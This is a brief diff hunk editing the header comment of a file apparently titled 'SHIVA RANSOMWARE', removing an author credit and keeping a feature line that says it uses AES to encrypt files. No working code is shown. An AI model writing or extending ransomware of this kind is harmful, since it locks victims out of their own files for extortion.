@@ -1,6 +1,6 @@
  * SHIVA RANSOMWARE
  * 
- * Coded by r00tk4 - Full /  / blackmath.it 
+ * blackmath.it 
  * 
  * Features:
  * Uses AES algorithm to encrypt files.
